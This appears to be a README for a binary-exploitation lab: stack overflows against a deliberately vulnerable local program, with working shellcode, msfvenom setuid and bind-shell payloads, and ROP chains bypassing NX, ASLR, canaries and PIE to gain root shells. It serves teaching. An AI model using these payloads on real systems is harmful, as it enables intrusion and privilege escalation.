- [Foreword](#foreword)
- [Usage](#usage)
  - [Prerequesties](#prerequesties)
    - [Platform](#platform)
    - [Disable ASLR](#disable-aslr)
    - [Tools](#tools)
  - [Normal usage](#normal-usage)
  - [Deny of service](#deny-of-service)
  - [Changing program behavior](#changing-program-behavior)
  - [Arbitrary code execution](#arbitrary-code-execution)
  - [Get root](#get-root)
  - [Remote code execution](#remote-code-execution)
  - [Bypass NX (execstack)](#bypass-nx-execstack)
  - [Bypass ASLR](#bypass-aslr)
  - [Bypass Stack Canary](#bypass-stack-canary)
  - [Bypass PIE](#bypass-pie)
- [Useful commands](#useful-commands)
- [Useful links](#useful-links)

# Foreword
This set of sources shows basic techniques of binary exploits. 

# Usage

## Prerequesties
### Platform
Tested on Ubuntu 22.04 x86_64

### Disable ASLR
```bash
$ echo 0 > /proc/sys/kernel/randomize_va_space
```

### Tools
- cmake
- gcc/clang
- GDB Peda
- metasploit
- python3
- pwntools
- Tested on Ubuntu 22.04

## Normal usage
```bash
$ ./stack_overflow
Enter a password: 
123
Authentication FAILED

./stack_overflow
Enter a password: 
1111111111
Authentication SUCCEEDED
```

## Deny of service
```python
$ python3 -c "print('A'*100)" | ./stack_overflow
Enter a password: 
Segmentation fault (core dumped)
```

## Changing program behavior
```python
$ python3 -c "print('A'*9 + '\x00'*12 + 'A'*9 + '\x00')" | ./stack_overflow
Enter a password: 
Authentication SUCCEEDED
```

## Arbitrary code execution

```python
$ gdb stack_overflow

gdb-peda$ pattern_create 200 pattern.in
Writing pattern of 200 chars to filename "pattern.in"

gdb-peda$ r < pattern.in 
Starting program: /home/talantov/projects/appsec/exploit/build/stack_overflow < pattern.in
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
Enter a password: 

Program received signal SIGSEGV, Segmentation fault.
Warning: 'set logging off', an alias for the command 'set logging enabled', is deprecated.
Use 'set logging enabled off'.

Warning: 'set logging on', an alias for the command 'set logging enabled', is deprecated.
Use 'set logging enabled on'.


[----------------------------------registers-----------------------------------]
RAX: 0x0 
RBX: 0x4134414165414149 ('IAAeAA4A')
RCX: 0x7fffffffde05 ("-AA(AADAA;A\271")
RDX: 0xb9 
RSI: 0x21 ('!')
RDI: 0x7fffffffddb0 --> 0xb9 
RBP: 0x3541416641414a41 ('AJAAfAA5')
RSP: 0x7fffffffde48 ("AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAqSUUUU")
RIP: 0x555555555370 (<_Z4authv+221>:	ret)
R8 : 0x21 ('!')
R9 : 0x55555556aeb0 ("Enter a password: \n")
R10: 0x7ffff780d560 --> 0xf002200006490 
R11: 0x246 
R12: 0x7fffffffdf88 --> 0x7fffffffe2d2 ("/home/talantov/projects/appsec/exploit/build/stack_overflow")
R13: 0x555555555371 (<main(int, char**)>:	endbr64)
R14: 0x555555557d68 --> 0x5555555551e0 (<__do_global_dtors_aux>:	endbr64)
R15: 0x7ffff7ffd040 --> 0x7ffff7ffe2e0 --> 0x555555554000 --> 0x10102464c457f
EFLAGS: 0x10293 (CARRY parity ADJUST zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x555555555366 <_Z4authv+211>:	call   0x55555555586a <_ZSteqIcSt11char_traitsIcEEbSt17basic_string_viewIT_T0_ENSt15__type_identityIS5_E4typeE>
   0x55555555536b <_Z4authv+216>:	mov    rbx,QWORD PTR [rbp-0x8]
   0x55555555536f <_Z4authv+220>:	leave  
=> 0x555555555370 <_Z4authv+221>:	ret    
   0x555555555371 <main(int, char**)>:	endbr64 
   0x555555555375 <main(int, char**)+4>:	push   rbp
   0x555555555376 <main(int, char**)+5>:	mov    rbp,rsp
   0x555555555379 <main(int, char**)+8>:	sub    rsp,0x20
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffde48 ("AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAqSUUUU")
0008| 0x7fffffffde50 ("6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAqSUUUU")
0016| 0x7fffffffde58 ("A7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAqSUUUU")
0024| 0x7fffffffde60 ("AA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAqSUUUU")
0032| 0x7fffffffde68 ("jAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAqSUUUU")
0040| 0x7fffffffde70 ("AkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAqSUUUU")
0048| 0x7fffffffde78 ("AAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAqSUUUU")
0056| 0x7fffffffde80 ("RAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAqSUUUU")
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x0000555555555370 in auth () at /home/talantov/projects/appsec/exploit/stack_overflow.cpp:23
23	}
gdb-peda$ pattern_offset AAKAAgAA6AALA
AAKAAgAA6AALA found at offset: 88
```

```bash
$ export PWN=`python3 -c 'import sys; sys.stdout.buffer.write(b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05")'`

$ ./getenvvar PWN ./stack_overflow
PWN will be at 0x7fffffffe523
```

Offset 88 points to return address position. Address **0x7fffffffe53d** points to shellcode position.
```bash
$ (python3 -c "import sys; sys.stdout.buffer.write(b'A'*88 + b'\x23\xe5\xff\xff\xff\x7f\x00\x00' + b'\n')"; cat) | ./stack_overflow
Enter a password: 
id
uid=1000(talantov) gid=1000(talantov) groups=1000(talantov),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),122(lpadmin),135(lxd),136(sambashare)
whoami
talantov
uname -a
Linux talantov-virtual-machine 6.2.0-33-generic #33~22.04.1-Ubuntu SMP PREEMPT_DYNAMIC Thu Sep  7 10:33:52 UTC 2 x86_64 x86_64 x86_64 GNU/Linux
```

## Get root
When bash executes it uses RUID as EUID (see diferences between EUID, RUID https://book.hacktricks.xyz/linux-hardening/privilege-escalation/euid-ruid-suid). If process is owned by root and has setuid flag, EUID will be set to root, but RUID will be corresponded to the user that executes the process. There is setuid syscall which sets both EUID and RUID to specified value (0 - means root). It could be used to change effective user to root before bash executing.

Without setuid call:
```bash
$ ps -o pid,euid,ruid,suid,cmd -A | grep stack_overflow 
PID    EUID  RUID  SUID CMD
14223     0  1000     0 ./stack_overflow
```

After setuid call:
 ```bash
$ ps -o pid,euid,ruid,suid,cmd -A | grep stack_overflow 
PID    EUID  RUID  SUID CMD
14223     0     0     0 ./stack_overflow
```

1. Gain shellcode with setuid(0), using msfvenom from metasploit, important option is PrependSetuid=True
   
```bash
$ msfvenom -p linux/x64/exec -f c CMD=/bin/sh PrependSetuid=True NullFreeVersion=True

Payload size: 63 bytes
Final size of c file: 291 bytes
unsigned char buf[] = 
"\x48\x31\xff\x6a\x69\x58\x0f\x05\x48\xb8\x2f\x2f\x62\x69"
"\x6e\x2f\x73\x68\x99\xeb\x1e\x5d\x52\x5b\xb3\x07\x88\x14"
"\x2b\x52\x66\x68\x2d\x63\x54\x5e\x52\x50\x54\x5f\x52\x55"
"\x56\x57\x54\x5e\x6a\x3b\x58\x0f\x05\xe8\xdd\xff\xff\xff"
"\x2f\x62\x69\x6e\x2f\x73\x68";
```

2. Change owner of stack_overflow binary, and set setuid bit
```bash
$ sudo chown root.root stack_overflow
$ sudo chmod u+s stack_overflow
```

3. Update PWN vairable with new shellcode
```bash
$ export PWN=`python3 -c 'import sys; sys.stdout.buffer.write(b"\x48\x31\xff\x6a\x69\x58\x0f\x05\x48\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x99\xeb\x1e\x5d\x52\x5b\xb3\x07\x88\x14\x2b\x52\x66\x68\x2d\x63\x54\x5e\x52\x50\x54\x5f\x52\x55\x56\x57\x54\x5e\x6a\x3b\x58\x0f\x05\xe8\xdd\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68")'`
```

4. Execute exploit once again
```python
$ ./getenvvar PWN ./stack_overflow
PWN will be at 0x7fffffffe4ff

$ (python3 -c "import sys; sys.stdout.buffer.write(b'A'*88 + b'\xff\xe4\xff\xff\xff\x7f\x00\x00' + b'\n')"; cat) | ./stack_overflow
```

5. Now you are root
```
Enter a password: 
id
uid=0(root) gid=1000(talantov) groups=1000(talantov),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),122(lpadmin),135(lxd),136(sambashare)
whoami
root
```

## Remote code execution
1. Gain shellcode for TCP server, using msfvenom from metasploit

```bash
$ msfvenom -p linux/x64/shell_bind_tcp_random_port -f c PrependSetuid=True

Payload size: 59 bytes
Final size of c file: 275 bytes
unsigned char buf[] = 
"\x48\x31\xff\x6a\x69\x58\x0f\x05\x6a\x29\x58\x99\x6a\x01"
"\x5e\x6a\x02\x5f\x0f\x05\x97\xb0\x32\x0f\x05\x96\xb0\x2b"
"\x0f\x05\x97\x96\xff\xce\x6a\x21\x58\x0f\x05\x75\xf7\x52"
"\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x57\x54\x5f\xb0"
"\x3b\x0f\x05";
```

Equivalent TCP-server program:

```c
#include <netinet/in.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <unistd.h>

int main(void)
{
    int sockfd = socket(AF_INET, SOCK_STREAM, 0);
    listen(sockfd, 1);
    int clientfd = accept(sockfd, NULL, NULL);
    dup2(clientfd, 0);
    dup2(clientfd, 1);
    dup2(clientfd, 2);
    char * const argv[] = {"sh",NULL, NULL};
    execve("/bin/sh", argv, NULL);
    return 0;
}
```

2. Update PWN vairable with new shellcode
```bash
$ export PWN=`python3 -c 'import sys; sys.stdout.buffer.write(b"\x48\x31\xff\x6a\x69\x58\x0f\x05\x6a\x29\x58\x99\x6a\x01\x5e\x6a\x02\x5f\x0f\x05\x97\xb0\x32\x0f\x05\x96\xb0\x2b\x0f\x05\x97\x96\xff\xce\x6a\x21\x58\x0f\x05\x75\xf7\x52\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x0f\x05")'`
```

3. Execute exploit once again
```python
$ ./getenvvar PWN ./stack_overflow
PWN will be at 0x7fffffffe503

$ (python3 -c "import sys; sys.stdout.buffer.write(b'A'*88 + b'\x03\xe5\xff\xff\xff\x7f\x00\x00' + b'\n')"; cat) | ./stack_overflow
```

4. Check open ports in other console:
```bash
$ netstat -ntlp
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.1:5432          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:631           0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:40819         0.0.0.0:*               LISTEN      2507/Code --standar 
tcp        0      0 0.0.0.0:37915           0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
tcp6       0      0 ::1:631                 :::*                    LISTEN      -                   
tcp6       0      0 :::80                   :::*                    LISTEN      -      
```

5. Connect to opened port 37915 and execute arbitrary commands

```bash
$ nc localhost 37915
id
uid=0(root) gid=1000(talantov) groups=1000(talantov),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),122(lpadmin),135(lxd),136(sambashare)
whoami
root
```

## Bypass NX (execstack)
We will use ret2libc trick with ROP chain.
1. Compile stack_overflow_bypass_nx without "-z execstack" flag
2. Check NX is actually enabled
```bash
$ gdb stack_overflow_bypass_nx
gdb-peda$ checksec 
CANARY    : disabled
FORTIFY   : disabled
NX        : ENABLED
PIE       : ENABLED
RELRO     : FULL
```
3. Search for "pop rdi; ret" gadget (we placed it intentionally to the code, but in large application probably it will be any way), this will be hacked return address:
```bash
$ gdb stack_overflow_bypass_nx
gdb-peda$ b main
gdb-peda$ r
gdb-peda$ ropsearch "pop rdi; ret"
Searching for ROP gadget: 'pop rdi; ret' in: binary ranges
0x0000555555555211 : (b'5fc3')	pop rdi; ret
```
4. Search for "system" function address:
```bash
gdb-peda$ p system
$1 = {int (const char *)} 0x7ffff7850d60 <__libc_system>
```
5. Search for "ret" gadget. It will be used to align stack.
```bash
gdb-peda$ ropsearch "ret"
Searching for ROP gadget: 'ret' in: binary ranges
0x000055555555501a : (b'c3')	ret
```
> The MOVAPS issue
If you're segfaulting on a movaps instruction in buffered_vfprintf() or do_system() in the x86_64 challenges, then ensure the stack is 16-byte aligned before returning to GLIBC functions such as printf() or system(). Some versions of GLIBC uses movaps instructions to move data onto the stack in certain functions. The 64 bit calling convention requires the stack to be 16-byte aligned before a call instruction but this is easily violated during ROP chain execution, causing all further calls from that function to be made with a misaligned stack. movaps triggers a general protection fault when operating on unaligned data, so try padding your ROP chain with an extra ret before returning into a function or return further into a function to skip a push instruction. https://ropemporium.com/guide.html
6. Search for "/bin/sh" string:
```bash
gdb-peda$ find "/bin/sh"
Searching for '/bin/sh' in: None ranges
Found 1 results, display max 1 items:
libc.so.6 : 0x7ffff79d8698 --> 0x68732f6e69622f ('/bin/sh')
```
7. Assemble exploit (rop_rdi_ret + bin_sh + ret + system):
```bash
$ (python3 -c "import sys; sys.stdout.buffer.write(b'A'*88 + b'\x11\x52\x55\x55\x55\x55\x00\x00' + b'\x98\x86\x9d\xf7\xff\x7f\x00\x00' + b'\x1a\x50\x55\x55\x55\x55\x00\x00' + b'\x60\x0d\x85\xf7\xff\x7f\x00\x00' + b'\n')"; cat) | ./stack_overflow_bypass_nx
```
8. The result:
```bash
Enter a password: 
id
uid=1000(talantov) gid=1000(talantov) groups=1000(talantov),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),122(lpadmin),135(lxd),136(sambashare)
```

## Bypass ASLR
ASLR randomizes address of mapped libc, so we cannot know it beforehand and call system function. But we can call system@plt section which as stable in binary (binary should be linked with -no-pie flag, for more information see https://sploitfun.blogspot.com/2013/06/dynamic-linking-internals.html). The only condition - system function should be presented in target binary, otherwise system@plt will be ommited. This technics is called ret2plt.
1. Compile binary with -no-pie flag
2. Enable system ASLR
```bash
$ echo 2 > /proc/sys/kernel/randomize_va_space
```
3. Check binary:
```bash
$ gdb stack_overflow_bypass_aslr
gdb-peda$ checksec 
CANARY    : disabled
FORTIFY   : disabled
NX        : ENABLED
PIE       : disabled
RELRO     : Partial
```
4. Search for system@plt address
```bash
$ objdump -d stack_overflow_bypass_aslr | grep "system@plt"
00000000004010e0 <system@plt>:
  401248:	e8 93 fe ff ff       	call   4010e0 <system@plt>
```
5. Search for "pop rdi; ret" gadget
```bash
gdb-peda$ ropsearch "pop rdi; ret"
Searching for ROP gadget: 'pop rdi; ret' in: binary ranges
0x0040124d : (b'5fc3')	pop rdi; ret
```
6. Search for "ret" gadger
```bash
gdb-peda$ ropsearch "ret"
Searching for ROP gadget: 'ret' in: binary ranges
0x0040101a : (b'c3')	ret
```
7. Search for "/bin/sh" string:
```bash
Searching for '/bin/sh' in: None ranges
Found 4 results, display max 4 items:
stack_overflow_bypass_aslr : 0x402004 --> 0x68732f6e69622f ('/bin/sh')
```
8. Assemble exploit (pop_rdi_ret + bin_sh + ret + system_plt):
```bash
$ (python3 -c "import sys; sys.stdout.buffer.write(b'A' * 88 + b'\x4d\x12\x40\x00\x00\x00\x00\x00' + b'\x04\x20\x40\x00\x00\x00\x00\x00' + b'\x1a\x10\x40\x00\x00\x00\x00\x00' + b'\xe0\x10\x40\x00\00\x00\x00\x00' + b'\n')"; cat) | ./stack_overflow_bypass_aslr
```

## Bypass Stack Canary
We'll be using brute force to reveal canary value byte by byte. This works only if the atacked applciation have forked child processes. Forked child processes have the same canary value and they could easily be resterated without restarting parent process. So we can select canary byte by byte using only 7 * 256 = 1792 tries. Use python + pwntools.
```bash
$ ./bypass_canary.py 
[+] Starting local process './build/stack_overflow_bypass_canary': pid 65259
[+] Found right byte 0x0
[+] Found right byte 0x18
[+] Found right byte 0x5e
[+] Found right byte 0x8c
[+] Found right byte 0xb
[+] Found right byte 0x16
[+] Found right byte 0x10
[+] Found right byte 0xe5
Found canary value: 00185e8c0b1610e5
[*] Switching to interactive mode
$ id
uid=1000(talantov) gid=1000(talantov) groups=1000(talantov),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),122(lpadmin),135(lxd),136(sambashare)
$ ls
all.txt          peda-session-stack_overflow_bypass_canary.txt
build          README.md
bypass_canary.py  shellcode.c
bypass_pie.py      stack_overflow_bypass_aslr.cpp
CMakeLists.txt      stack_overflow_bypass_canary.cpp
dump          stack_overflow_bypass_nx.cpp
getenvvar.c      stack_overflow.cpp
mysh.c          test.py
payload
$  
```

## Bypass PIE
The same brute force way could be used to bypass PIE (position independent executable). Important to disabe RBP registry in stack (-fomit-frame-pointer), but for release builds it is already disabled.
Beforehand determine base offset address, it will be used to define absolute base address in bypass_pie.py:
```bash
$ objdump -d ./stack_overflow_bypass_pie | grep init
Disassembly of section .init:
0000000000001000 <_init>:
```
```bash
$ ./bypass_pie.py 
[+] Starting local process './build/stack_overflow_bypass_pie': pid 67468
[+] Start bruteforcing canary...
[+] Found right byte 0x0
[+] Found right byte 0x15
[+] Found right byte 0xe
[+] Found right byte 0x34
[+] Found right byte 0x45
[+] Found right byte 0xfb
[+] Found right byte 0xd1
[+] Found right byte 0x4e
Found canary value: 00150e3445fbd14e
[+] Start bruteforcing return address...
[+] Found right byte 0x92
[+] Found right byte 0xb4
[+] Found right byte 0xbb
[+] Found right byte 0xe8
[+] Found right byte 0x8c
[+] Found right byte 0x55
[+] Found right byte 0x0
[+] Found right byte 0x0
Found return address value: 0x558ce8bbb492
[*] '/home/talantov/projects/appsec/exploit/build/stack_overflow_bypass_pie'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] Loading gadgets for '/home/talantov/projects/appsec/exploit/build/stack_overflow_bypass_pie'
Init offset: 0x1000
Base address: 0x558ce8bba000
Bin sh: 0x558ce8bbc004
Pop rdi: 0x558ce8bbb2e0
Ret: 0x558ce8bbb01a
System plt: 0x558ce8bbb144
[*] Switching to interactive mode
$ id
uid=1000(talantov) gid=1000(talantov) groups=1000(talantov),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),122(lpadmin),135(lxd),136(sambashare)
$ ls
all.txt          peda-session-stack_overflow_bypass_canary.txt
build          README.md
bypass_canary.py  shellcode.c
bypass_pie.py      stack_overflow_bypass_aslr.cpp
CMakeLists.txt      stack_overflow_bypass_canary.cpp
dump          stack_overflow_bypass_nx.cpp
getenvvar.c      stack_overflow.cpp
mysh.c          test.py
payload
$  
```

# Useful commands
Show memory at address in gdb:
```bash
gdb-peda$ x/100xb 0x7fffffffdde0
0x7fffffffdde0:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
0x7fffffffdde8:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
0x7fffffffddf0:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
0x7fffffffddf8:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
0x7fffffffde00:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
0x7fffffffde08:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
0x7fffffffde10:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
0x7fffffffde18:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
0x7fffffffde20:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
0x7fffffffde28:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
0x7fffffffde30:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
0x7fffffffde38:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
0x7fffffffde40:	0x41	0x41	0x41	0x41
```
* x - means exemine memory
* 100 - repeats number
* x - hexidecimal format. Also could be:
  *  s - null-terminated string
  *  i - machine instruction
* b - unit size is byte. Also could be:
  * h - Halfwords (two bytes).
  * w - Words (four bytes). This is the initial default.
  * g - Giant words (eight bytes).

Memory segments with their rights for executed process pmap <pid>:
```bash
$ pmap 43751
43751:   ./stack_overflow
0000555555554000      4K r---- stack_overflow
0000555555555000      4K r-x-- stack_overflow
0000555555556000      4K r---- stack_overflow
0000555555557000      4K r---- stack_overflow
0000555555558000      4K rw--- stack_overflow
0000555555559000    132K rw---   [ anon ]
00007ffff7800000    160K r---- libc.so.6
00007ffff7828000   1620K r-x-- libc.so.6
00007ffff79bd000    352K r---- libc.so.6
00007ffff7a15000     16K r---- libc.so.6
00007ffff7a19000      8K rw--- libc.so.6
00007ffff7a1b000     52K rw---   [ anon ]
00007ffff7c00000    616K r---- libstdc++.so.6.0.30
00007ffff7c9a000   1092K r-x-- libstdc++.so.6.0.30
00007ffff7dab000    444K r---- libstdc++.so.6.0.30
00007ffff7e1a000      4K ----- libstdc++.so.6.0.30
00007ffff7e1b000     44K r---- libstdc++.so.6.0.30
00007ffff7e26000     12K rw--- libstdc++.so.6.0.30
00007ffff7e29000     12K rw---   [ anon ]
00007ffff7e9d000     16K rw---   [ anon ]
00007ffff7ea1000     12K r---- libgcc_s.so.1
00007ffff7ea4000     92K r-x-- libgcc_s.so.1
00007ffff7ebb000     16K r---- libgcc_s.so.1
00007ffff7ebf000      4K r---- libgcc_s.so.1
00007ffff7ec0000      4K rw--- libgcc_s.so.1
00007ffff7ec1000     56K r---- libm.so.6
00007ffff7ecf000    496K r-x-- libm.so.6
00007ffff7f4b000    364K r---- libm.so.6
00007ffff7fa6000      4K r---- libm.so.6
00007ffff7fa7000      4K rw--- libm.so.6
00007ffff7fbb000      8K rw---   [ anon ]
00007ffff7fbd000     16K r----   [ anon ]
00007ffff7fc1000      8K r-x--   [ anon ]
00007ffff7fc3000      8K r---- ld-linux-x86-64.so.2
00007ffff7fc5000    168K r-x-- ld-linux-x86-64.so.2
00007ffff7fef000     44K r---- ld-linux-x86-64.so.2
00007ffff7ffb000      8K r---- ld-linux-x86-64.so.2
00007ffff7ffd000      8K rw--- ld-linux-x86-64.so.2
00007ffffffde000    132K rwx--   [ stack ]
ffffffffff600000      4K --x--   [ anon ]
 total             6056K

```
The same via proc maps:
```bash
$ cat /proc/43751/maps
555555554000-555555555000 r--p 00000000 08:03 299005                     /home/talantov/projects/appsec/exploit/build/stack_overflow
555555555000-555555556000 r-xp 00001000 08:03 299005                     /home/talantov/projects/appsec/exploit/build/stack_overflow
555555556000-555555557000 r--p 00002000 08:03 299005                     /home/talantov/projects/appsec/exploit/build/stack_overflow
555555557000-555555558000 r--p 00002000 08:03 299005                     /home/talantov/projects/appsec/exploit/build/stack_overflow
555555558000-555555559000 rw-p 00003000 08:03 299005                     /home/talantov/projects/appsec/exploit/build/stack_overflow
555555559000-55555557a000 rw-p 00000000 00:00 0                          [heap]
7ffff7800000-7ffff7828000 r--p 00000000 08:03 3696787                    /usr/lib/x86_64-linux-gnu/libc.so.6
7ffff7828000-7ffff79bd000 r-xp 00028000 08:03 3696787                    /usr/lib/x86_64-linux-gnu/libc.so.6
7ffff79bd000-7ffff7a15000 r--p 001bd000 08:03 3696787                    /usr/lib/x86_64-linux-gnu/libc.so.6
7ffff7a15000-7ffff7a19000 r--p 00214000 08:03 3696787                    /usr/lib/x86_64-linux-gnu/libc.so.6
7ffff7a19000-7ffff7a1b000 rw-p 00218000 08:03 3696787                    /usr/lib/x86_64-linux-gnu/libc.so.6
7ffff7a1b000-7ffff7a28000 rw-p 00000000 00:00 0 
7ffff7c00000-7ffff7c9a000 r--p 00000000 08:03 3690467                    /usr/lib/x86_64-linux-gnu/libstdc++.so.6.0.30
7ffff7c9a000-7ffff7dab000 r-xp 0009a000 08:03 3690467                    /usr/lib/x86_64-linux-gnu/libstdc++.so.6.0.30
7ffff7dab000-7ffff7e1a000 r--p 001ab000 08:03 3690467                    /usr/lib/x86_64-linux-gnu/libstdc++.so.6.0.30
7ffff7e1a000-7ffff7e1b000 ---p 0021a000 08:03 3690467                    /usr/lib/x86_64-linux-gnu/libstdc++.so.6.0.30
7ffff7e1b000-7ffff7e26000 r--p 0021a000 08:03 3690467                    /usr/lib/x86_64-linux-gnu/libstdc++.so.6.0.30
7ffff7e26000-7ffff7e29000 rw-p 00225000 08:03 3690467                    /usr/lib/x86_64-linux-gnu/libstdc++.so.6.0.30
7ffff7e29000-7ffff7e2c000 rw-p 00000000 00:00 0 
7ffff7e9d000-7ffff7ea1000 rw-p 00000000 00:00 0 
7ffff7ea1000-7ffff7ea4000 r--p 00000000 08:03 3677686                    /usr/lib/x86_64-linux-gnu/libgcc_s.so.1
7ffff7ea4000-7ffff7ebb000 r-xp 00003000 08:03 3677686                    /usr/lib/x86_64-linux-gnu/libgcc_s.so.1
7ffff7ebb000-7ffff7ebf000 r--p 0001a000 08:03 3677686                    /usr/lib/x86_64-linux-gnu/libgcc_s.so.1
7ffff7ebf000-7ffff7ec0000 r--p 0001d000 08:03 3677686                    /usr/lib/x86_64-linux-gnu/libgcc_s.so.1
7ffff7ec0000-7ffff7ec1000 rw-p 0001e000 08:03 3677686                    /usr/lib/x86_64-linux-gnu/libgcc_s.so.1
7ffff7ec1000-7ffff7ecf000 r--p 00000000 08:03 3697436                    /usr/lib/x86_64-linux-gnu/libm.so.6
7ffff7ecf000-7ffff7f4b000 r-xp 0000e000 08:03 3697436                    /usr/lib/x86_64-linux-gnu/libm.so.6
7ffff7f4b000-7ffff7fa6000 r--p 0008a000 08:03 3697436                    /usr/lib/x86_64-linux-gnu/libm.so.6
7ffff7fa6000-7ffff7fa7000 r--p 000e4000 08:03 3697436                    /usr/lib/x86_64-linux-gnu/libm.so.6
7ffff7fa7000-7ffff7fa8000 rw-p 000e5000 08:03 3697436                    /usr/lib/x86_64-linux-gnu/libm.so.6
7ffff7fbb000-7ffff7fbd000 rw-p 00000000 00:00 0 
7ffff7fbd000-7ffff7fc1000 r--p 00000000 00:00 0                          [vvar]
7ffff7fc1000-7ffff7fc3000 r-xp 00000000 00:00 0                          [vdso]
7ffff7fc3000-7ffff7fc5000 r--p 00000000 08:03 3696447                    /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
7ffff7fc5000-7ffff7fef000 r-xp 00002000 08:03 3696447                    /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
7ffff7fef000-7ffff7ffa000 r--p 0002c000 08:03 3696447                    /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
7ffff7ffb000-7ffff7ffd000 r--p 00037000 08:03 3696447                    /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
7ffff7ffd000-7ffff7fff000 rw-p 00039000 08:03 3696447                    /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
7ffffffde000-7ffffffff000 rwxp 00000000 00:00 0                          [stack]
ffffffffff600000-ffffffffff601000 --xp 00000000 00:00 0                  [vsyscall]
```

Output hexidecimal file content:
```bash
$ python3 -c "import sys; sys.stdout.buffer.write(b'A'*61 + b'\x0e\xe5\xff\xff\xff\x7f\x00\x00' + b'\n')" > exploit.in
$ hexdump exploit.in 

0000000 4141 4141 4141 4141 4141 4141 4141 4141
*
0000030 4141 4141 4141 4141 4141 4141 0e41 ffe5
0000040 ffff 007f 0a00                         
0000046

```

Hexidecimal binary file view:
```bash
$ xxd stack_overflow

00000000: 7f45 4c46 0201 0100 0000 0000 0000 0000  .ELF............
00000010: 0300 3e00 0100 0000 e010 0000 0000 0000  ..>.............
00000020: 4000 0000 0000 0000 d036 0000 0000 0000  @........6......
00000030: 0000 0000 4000 3800 0d00 4000 1f00 1e00  ....@.8...@.....
00000040: 0600 0000 0400 0000 4000 0000 0000 0000  ........@.......
00000050: 4000 0000 0000 0000 4000 0000 0000 0000  @.......@.......
00000060: d802 0000 0000 0000 d802 0000 0000 0000  ................
00000070: 0800 0000 0000 0000 0300 0000 0400 0000  ................
00000080: 1803 0000 0000 0000 1803 0000 0000 0000  ................
00000090: 1803 0000 0000 0000 1c00 0000 0000 0000  ................
000000a0: 1c00 0000 0000 0000 0100 0000 0000 0000  ................
000000b0: 0100 0000 0400 0000 0000 0000 0000 0000  ................
000000c0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
000000d0: 8806 0000 0000 0000 8806 0000 0000 0000  ................
000000e0: 0010 0000 0000 0000 0100 0000 0500 0000  ................
000000f0: 0010 0000 0000 0000 0010 0000 0000 0000  ................
00000100: 0010 0000 0000 0000 d901 0000 0000 0000  ................
00000110: d901 0000 0000 0000 0010 0000 0000 0000  ................
00000120: 0100 0000 0400 0000 0020 0000 0000 0000  ......... ......
```

Show content of rodata section:
```bash
